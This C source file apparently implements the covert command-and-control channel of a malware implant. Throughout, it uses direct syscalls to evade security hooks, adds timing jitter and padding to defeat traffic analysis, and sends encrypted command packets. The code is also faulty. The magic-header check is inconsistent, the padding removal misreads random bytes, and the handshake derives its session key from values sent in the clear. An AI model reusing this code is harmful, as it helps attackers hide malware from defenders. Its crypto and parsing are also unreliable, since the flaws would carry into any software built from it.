/*
 * Stealth Network Protocol Implementation
 * Custom protocol with traffic obfuscation
 */

#include <stdint.h>
#include "protocol.h"
#include "../crypto/aes.h"

// Protocol constants (obfuscated)
#define MAGIC_HEADER    0xDEADC0DE ^ 0x12345678
#define PROTO_VERSION   0x01
#define MAX_PACKET_SIZE 4096

// Packet structure
typedef struct {
    uint32_t magic;      // Magic header (XOR'd)
    uint8_t  version;    // Protocol version
    uint8_t  flags;      // Packet flags
    uint16_t length;     // Payload length
    uint32_t seq;        // Sequence number
    uint32_t checksum;   // CRC32 checksum
    uint8_t  iv[16];     // AES IV/nonce
    uint8_t  data[];     // Encrypted payload
} packet_header_t;

// Connection state
typedef struct {
    int sock;
    uint32_t seq_send;
    uint32_t seq_recv;
    uint8_t session_key[32];
    int connected;
} conn_state_t;

// Direct syscalls for networking (bypass hooks)
#ifdef _LINUX
static long sys_socket(int domain, int type, int protocol) {
    long ret;
    __asm__ volatile(
        "mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov $41, %%rax\n"  // SYS_socket
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(ret)
        : "r"((long)domain), "r"((long)type), "r"((long)protocol)
        : "rdi", "rsi", "rdx", "rax", "memory"
    );
    return ret;
}

static long sys_connect(int fd, const void* addr, int addrlen) {
    long ret;
    __asm__ volatile(
        "mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov $42, %%rax\n"  // SYS_connect
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(ret)
        : "r"((long)fd), "r"((long)addr), "r"((long)addrlen)
        : "rdi", "rsi", "rdx", "rax", "memory"
    );
    return ret;
}

static long sys_send(int fd, const void* buf, size_t len, int flags) {
    long ret;
    __asm__ volatile(
        "mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov %4, %%r10\n"
        "mov $44, %%rax\n"  // SYS_sendto
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(ret)
        : "r"((long)fd), "r"((long)buf), "r"(len), "r"((long)flags)
        : "rdi", "rsi", "rdx", "r10", "rax", "memory"
    );
    return ret;
}

static long sys_recv(int fd, void* buf, size_t len, int flags) {
    long ret;
    __asm__ volatile(
        "mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov %4, %%r10\n"
        "mov $45, %%rax\n"  // SYS_recvfrom
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(ret)
        : "r"((long)fd), "r"((long)buf), "r"(len), "r"((long)flags)
        : "rdi", "rsi", "rdx", "r10", "rax", "memory"
    );
    return ret;
}
#endif

// CRC32 implementation (small and fast)
static uint32_t crc32(const uint8_t* data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    
    return ~crc;
}

// Generate random bytes
static void random_bytes(uint8_t* buf, size_t len) {
    #ifdef _WIN32
        // Use Windows crypto API
        HCRYPTPROV hProv;
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
        CryptGenRandom(hProv, len, buf);
        CryptReleaseContext(hProv, 0);
    #else
        // Use /dev/urandom
        int fd = open("/dev/urandom", 0);
        if (fd >= 0) {
            read(fd, buf, len);
            close(fd);
        } else {
            // Fallback to weak PRNG
            for (size_t i = 0; i < len; i++) {
                buf[i] = (uint8_t)(rand() & 0xFF);
            }
        }
    #endif
}

// Traffic padding for obfuscation
static void add_padding(uint8_t* data, size_t* len) {
    // Add random padding to obscure packet size
    size_t pad_len = (rand() % 32) + 1;
    
    // Ensure we don't exceed buffer
    if (*len + pad_len > MAX_PACKET_SIZE - sizeof(packet_header_t))
        pad_len = MAX_PACKET_SIZE - sizeof(packet_header_t) - *len;
    
    // Add random padding
    random_bytes(data + *len, pad_len);
    *len += pad_len;
}

// Timing jitter for traffic analysis resistance
static void add_jitter() {
    // Random delay between 0-50ms
    int delay = rand() % 50;
    #ifdef _WIN32
        Sleep(delay);
    #else
        usleep(delay * 1000);
    #endif
}

// Create connection with advanced evasion
int protocol_connect(conn_state_t* state, const char* host, uint16_t port) {
    // Add random delay to avoid pattern detection
    add_jitter();
    
    #ifdef _LINUX
        // Use direct syscalls to bypass hooks
        state->sock = sys_socket(AF_INET, SOCK_STREAM, 0);
    #else
        state->sock = socket(AF_INET, SOCK_STREAM, 0);
    #endif
    
    if (state->sock < 0) return -1;
    
    // Set socket options for stealth
    int opt = 1;
    setsockopt(state->sock, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));
    
    // TCP_NODELAY to avoid traffic patterns
    setsockopt(state->sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    
    // Connect with retry and backoff
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);
    
    #ifdef _LINUX
        if (sys_connect(state->sock, &addr, sizeof(addr)) < 0) {
    #else
        if (connect(state->sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
    #endif
            close(state->sock);
            return -1;
        }
    
    // Perform handshake
    return protocol_handshake(state);
}

// Custom handshake with mutual authentication
int protocol_handshake(conn_state_t* state) {
    uint8_t challenge[32];
    uint8_t response[32];
    
    // Generate challenge
    random_bytes(challenge, sizeof(challenge));
    
    // Send challenge
    if (send(state->sock, challenge, sizeof(challenge), 0) != sizeof(challenge))
        return -1;
    
    // Receive response
    if (recv(state->sock, response, sizeof(response), 0) != sizeof(response))
        return -1;
    
    // Derive session key from challenge/response
    for (int i = 0; i < 32; i++) {
        state->session_key[i] = challenge[i] ^ response[i];
    }
    
    // Use SHA256 to strengthen key
    sha256(state->session_key, 32, state->session_key);
    
    state->connected = 1;
    state->seq_send = rand();
    state->seq_recv = 0;
    
    return 0;
}

// Send packet with encryption and obfuscation
int protocol_send(conn_state_t* state, uint8_t cmd, const uint8_t* data, size_t len) {
    if (!state->connected) return -1;
    
    // Add traffic jitter
    add_jitter();
    
    // Prepare packet
    uint8_t packet[MAX_PACKET_SIZE];
    packet_header_t* hdr = (packet_header_t*)packet;
    
    // Build header
    hdr->magic = MAGIC_HEADER ^ 0x12345678;
    hdr->version = PROTO_VERSION;
    hdr->flags = cmd;
    hdr->seq = state->seq_send++;
    
    // Generate IV
    random_bytes(hdr->iv, sizeof(hdr->iv));
    
    // Copy data to packet
    if (len > 0) {
        memcpy(packet + sizeof(packet_header_t), data, len);
    }
    
    // Add padding
    add_padding(packet + sizeof(packet_header_t), &len);
    hdr->length = len;
    
    // Encrypt payload
    aes256_ctr_crypt(packet + sizeof(packet_header_t), len, 
                     state->session_key, hdr->iv);
    
    // Calculate checksum
    hdr->checksum = crc32(packet + sizeof(packet_header_t), len);
    
    // Send packet
    size_t total_len = sizeof(packet_header_t) + len;
    
    #ifdef _LINUX
        return sys_send(state->sock, packet, total_len, 0) == total_len ? 0 : -1;
    #else
        return send(state->sock, packet, total_len, 0) == total_len ? 0 : -1;
    #endif
}

// Receive packet with decryption
int protocol_recv(conn_state_t* state, uint8_t* cmd, uint8_t* data, size_t* len) {
    if (!state->connected) return -1;
    
    uint8_t packet[MAX_PACKET_SIZE];
    packet_header_t* hdr = (packet_header_t*)packet;
    
    // Receive header
    size_t received = 0;
    while (received < sizeof(packet_header_t)) {
        #ifdef _LINUX
            int n = sys_recv(state->sock, packet + received, 
                           sizeof(packet_header_t) - received, 0);
        #else
            int n = recv(state->sock, packet + received,
                        sizeof(packet_header_t) - received, 0);
        #endif
        
        if (n <= 0) {
            state->connected = 0;
            return -1;
        }
        received += n;
    }
    
    // Verify magic
    if ((hdr->magic ^ 0x12345678) != MAGIC_HEADER)
        return -1;
    
    // Check version
    if (hdr->version != PROTO_VERSION)
        return -1;
    
    // Receive payload
    if (hdr->length > 0) {
        received = 0;
        while (received < hdr->length) {
            #ifdef _LINUX
                int n = sys_recv(state->sock, packet + sizeof(packet_header_t) + received,
                               hdr->length - received, 0);
            #else
                int n = recv(state->sock, packet + sizeof(packet_header_t) + received,
                           hdr->length - received, 0);
            #endif
            
            if (n <= 0) {
                state->connected = 0;
                return -1;
            }
            received += n;
        }
        
        // Verify checksum
        uint32_t calc_crc = crc32(packet + sizeof(packet_header_t), hdr->length);
        if (calc_crc != hdr->checksum)
            return -1;
        
        // Decrypt payload
        aes256_ctr_crypt(packet + sizeof(packet_header_t), hdr->length,
                        state->session_key, hdr->iv);
        
        // Remove padding (last byte indicates padding length)
        size_t real_len = hdr->length;
        if (real_len > 0) {
            uint8_t pad_len = packet[sizeof(packet_header_t) + real_len - 1];
            if (pad_len < real_len)
                real_len -= pad_len;
        }
        
        // Copy to output
        if (real_len > 0 && real_len <= *len) {
            memcpy(data, packet + sizeof(packet_header_t), real_len);
            *len = real_len;
        }
    }
    
    // Update sequence
    state->seq_recv = hdr->seq;
    
    // Return command
    *cmd = hdr->flags;
    
    return 0;
}